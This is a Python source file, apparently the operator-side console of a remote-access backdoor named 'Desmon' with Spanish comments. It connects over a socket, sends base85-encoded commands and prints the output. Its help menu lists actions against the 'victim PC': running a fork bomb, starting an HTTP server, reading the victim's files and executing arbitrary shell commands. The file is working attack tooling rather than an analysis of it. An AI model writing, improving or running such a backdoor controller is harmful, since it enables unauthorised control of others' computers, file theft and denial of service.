#! /usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import base64
import datetime
import os
import subprocess
import sys

from http.server import BaseHTTPRequestHandler, HTTPServer

from os import read

global _CodingBase85Text
global _DecodingBase85Text
global i


def _MAIN():
    i = 1
    print("""\033[1;37m
                                .....
                              .,clloc'
                             .coc:::c:.
                            .lkocll;;lc:;.
                            .xX0xdoloxxkko.
                      ...    'loddOOkOXNXd.
                       ,ol:'.  .;cx0KKK0ko,.
                       .cOOdcc:,..':loodddc.
            ..          .ckOKNN0:. ...',,,.
         ....            .;xNWWWKl.
        ..                 ,OWWWWKl.
         ..                .:OX0x:.
            .               .dO:.
                            .ll.
 \033[1;31mm    m               mmmmm         #               m
 ##  ##  m mm         #   "#  mmm   #mmm    mmm   mm#mm
 # ## #  #"  "        #mmmm" #" "#  #" "#  #" "#    #
 # "" #  #            #   "m #   #  #   #  #   #    #
 #    #  #       #    #    " "#m#"  ##m#"  "#m#"    "mm\033[1;37m

             ..                ..
             .                  .
            ..                  ..
            ..              ..   .
            .                .   .
            .             .   ...
            .             .    .\033[1;37m
    """)

    def _CodingBase85Text(ServerConnect, text):
        data = base64.b85encode(text.encode('ascii'), pad=False)
        ServerConnect.send(data)

    def _DecodingBase85Text(ServerConnect, buff):
        try:
            data = ServerConnect.recv(int(buff)).decode()
            data = base64.b85decode(data)
            return str(data.decode('ascii'))
        except (ValueError, KeyboardInterrupt):
            print("\033[1;36merror de valores o de Keyboard")
            #i = 2

    class BackDoor:

        def __init__(self):

            self.Host = '127.0.0.1'

            try:
                self.Port = sys.argv[1]
                self.Port = int(self.Port)
            except IndexError:
                self.Port = 6365

            self.Green = "\033[1;32m"
            self.White = "\033[1;37m"
            self.Data = None
            self.buffer = 2048
            i = 1

            self.Client = socket.socket()
            self.Time = str(datetime.date.today())
            self.Cwd = str(os.getcwd())

        def Connection(self):
            print("intentando conectarse a " + str(self.Host)+":"+str(self.Port))
            self.Client.connect((str(self.Host), int(self.Port)))
            print(_DecodingBase85Text(self.Client, 8000))

            while int(i) == 1:
                try:
                    #ruta = _DecodingBase85Text(self.Client, self.buffer)
                    command = str(input(
                        self.Green+'[*]'+"\033[1;33m{"+str(self.Cwd)+"}"+self.White+'Desmon:>> '))

                    if str(command) == 'exit':
                        _CodingBase85Text(self.Client, str('exit'))
                        self.Client.close()
                        break

                    elif str(command) == '' or str(command) == ' ' or str(command) == '\n':
                        print("comando incorrecto")


                    elif str(command) == 'cd':
                        dat = str(input("ruta a la que acede: "))
                        _CodingBase85Text(self.Client, str(dat))
                        buff = _DecodingBase85Text(self.Client, 8000)
                        print(buff)
                        #ruta

                    elif str(command) == 'OsInfo':
                        _CodingBase85Text(self.Client, str('OsInfo'))
                        data = _DecodingBase85Text(self.Client, 8000)
                        print(str(data))

                    elif str(command) == 'cwd':
                        _CodingBase85Text(self.Client, str('cwd'))
                        self.Cwd = str(_DecodingBase85Text(self.Client, 8000))

                    elif str(command) == 'HttpServer':
                        _CodingBase85Text(self.Client, str('HttpServer'))
                        #PortHttp = int(input("introduce el puerto que abrir: "))
                        #_CodingBase85Text(self.Client, str(PortHttp))
                        print(_DecodingBase85Text(self.Client, 8000))

                    elif str(command) == 'CloseHttpServer':
                        _CodingBase85Text(self.Client, str('CloseHttpServer'))
                        data = _DecodingBase85Text(self.Client, 8000)
                        print(str(data))

                    elif str(command) == 'cd ..':
                        _CodingBase85Text(self.Client, str('cd ..'))
                        print("se consigio cambiar al repositorio anterior.")
                        self.Cwd = _DecodingBase85Text(self.Client, 2048)

                    elif str(command) == 'clear':
                        if sys.platform == 'linux' or sys.platform == 'linux2':
                            os.system("clear")
                        elif sys.platform == 'win32':
                            os.system("cls")
                        else :
                            os.system("cls")
                    elif str(command) == 'read':
                        _CodingBase85Text(self.Client, str('read'))
                        _CodingBase85Text(self.Client, str(input("nombre del archivo a leer: ")))
                        _type = str(_DecodingBase85Text(self.Client, 8000))
                        if _type == 'binary':
                            a = self.Client.recv(self.buffer).decode('utf-16')
                            a = base64.b85decode(str(a))
                            print(a)
                        elif _type == 'no binary':
                            print(str(_DecodingBase85Text(self.Client, self.buffer)))

                    elif str(command) == 'help' or str(command) == 'ayuda':
                        print("""
                        ---------------------------------------------------------------
                        -                      comandos disponibles                    -
                        ----------------------------------------------------------------
                        -exit                      con este finalizas las conesiones   -
                        ----------------------------------------------------------------
                        -cd                con este pordras desplazarte entre carpetas -
                        ----------------------------------------------------------------
                        -BombFork          este ejecuta una bomba fork en el pc victima-
                        ----------------------------------------------------------------
                        -cwd                    para poder ver la ruta del directorio  -
                        ----------------------------------------------------------------
                        -HttpServer           ejecuta un server Http en la pc victimma -
                        ----------------------------------------------------------------
                        -CloseHttpServer                 finaliza el server http       -
                        ----------------------------------------------------------------
                        -cd ..                         retrocede un directorio         -
                        ----------------------------------------------------------------
                        -read                           lee archivos de la pc victima  -
                        ----------------------------------------------------------------
                        - otros comandos compatibles con el dispositivo de la victima  -
                        ----------------------------------------------------------------
                        """)

                    else:

                        _CodingBase85Text(self.Client, str(command))

                        if self.buffer == None or self.buffer == 0:
                            self.buffer = 2048
                        else:
                            opert = _DecodingBase85Text(self.Client, self.buffer)

                            if opert == None:
                                self.buffer = 3000
                            else:
                                pass

                            # el server manda la longitud del oput que va a enviar para definir el buffer, si tiene 10 caracteres = 10 bit a de multiplicarse por 8 para saber los bit a definir
                            self.buffer = int(self.buffer) * 8 + 50

                            if int(self.buffer) < 80000:
                                self.buffer = 100000
                            elif int(self.buffer) > 80000:
                                self.buffer = int(self.buffer) + 3000

                            # establcemos el buffer del mensaje y lo recibimos
                            data = _DecodingBase85Text(
                                self.Client, self.buffer)
                            print(str(data))
                            data = None  # restablecemos la variable data
                            self.buffer = 3000 * 8 + 50

                        if sys.platform == 'linux' or sys.platform == 'linux2':
                            subprocess.getstatusoutput("clear")
                        elif sys.platform == 'win32':
                            subprocess.getstatusoutput("cls")
                        else :
                            subprocess.getstatusoutput("cls")
                        #print(_DecodingBase85Text(self.Client, 8000))

                except UnicodeDecodeError:
                    print(
                        '\033[1;36mocurrio un error de descodificaion unicode en el cliente')

    BackDoor = BackDoor()
    BackDoor.Connection()


if __name__ == "__main__":
    # while True:
    _MAIN()
